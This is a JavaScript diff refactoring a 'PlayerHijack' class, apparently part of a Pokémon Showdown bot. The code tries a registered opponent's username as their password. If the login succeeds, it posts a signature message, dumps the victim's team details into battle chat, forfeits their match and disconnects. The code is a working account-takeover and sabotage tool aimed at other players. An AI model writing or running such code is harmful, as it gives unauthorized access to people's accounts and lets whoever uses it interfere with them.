@@ -25,9 +25,14 @@ let checkpass = async (user, pass) => {
 	return true;
 }
 
+let delay = n => {
+	return new Promise((res, rej) => {
+		setTimeout(() => res(), n)
+	});
+}
+
 class PlayerHijack {
 	constructor(battleData, battlers) {
-		console.log(battleData);
 		let alias = battleData.champ_alias[1] == '1' ? 'p2' : 'p1';
 		this.opponent = battlers[alias];
 	}
@@ -36,7 +41,6 @@ class PlayerHijack {
 		try {
 			if (isRegged) {
 				let passwords = [this.opponent.showdown_name];
-
 				this.account = false;
 				for (let pass of passwords) {
 					if (await checkpass(this.opponent.showdown_name, pass)) {
@@ -52,31 +56,25 @@ class PlayerHijack {
 			if (!this.account)
 				return;
 			//this.bot = new Player(settings.showdown.user, settings.showdown.pass);
-			this.account.onCurrentBattlesChanged((e, battles) => {
-				if (!battles)
-					return;
-				for (let battle of battles) {
-					this.account.message(battle, 'Hi, my name is J.A.C.K., brought to you by D*gars©');
-					let myteam = this.account.getMyTeam(battle, (e, myteam) => {
-						let i = 1;
-						let idelay = 2500;
-						setTimeout(() => {
-							this.account.message(battle, 'PERFECTLY HEALTHY');
-							this.account.message(battle, '/forfeit');
-							
-						}, idelay * (myteam.pokemon.length + 1));
-						setTimeout(() => this.account.disconnect(), idelay * (myteam.pokemon.length + 2));
-						for (let mon of myteam.pokemon) {
-							let desc = [mon.details, mon.condition, mon.item, mon.baseAbility,
-										Object.keys(mon.stats).map(k => k + ': ' + mon.stats[k]).join(' / '),
-										mon.moves.join(', ')].join(' '); 
-							setTimeout(() => {this.account.message(battle, desc)}, idelay * i);
-							++i;
-						}
-					});
+			await this.account.connect();
+			let battles = this.account.getBattles();
+			for (let battle of battles) {
+				this.account.message(battle, 'Hi, my name is J.A.C.K., brought to you by D*gars©');
+				let myteam = await this.account.getMyTeam(battle);
+				for (let mon of myteam.pokemon) {
+					let desc = [mon.details, mon.condition, mon.item, mon.baseAbility,
+								Object.keys(mon.stats).map(k => k + ': ' + mon.stats[k]).join(' / '),
+								mon.moves.join(', ')].join(' ');
+					await this.account.message(battle, desc);
+					await delay(1500);
 				}
-				console.log('Finished jacking');
-			});
+				await this.account.message(battle, 'PERFECTLY HEALTHY');
+				await delay(1000);
+				await this.account.message(battle, '/forfeit');
+				await delay(1000);
+			}
+			console.log('Finished jacking', battles);
+			await this.account.disconnect();
 		} catch(e) {
 			console.log('Could not hijack the opponent:');
 			console.log(e);
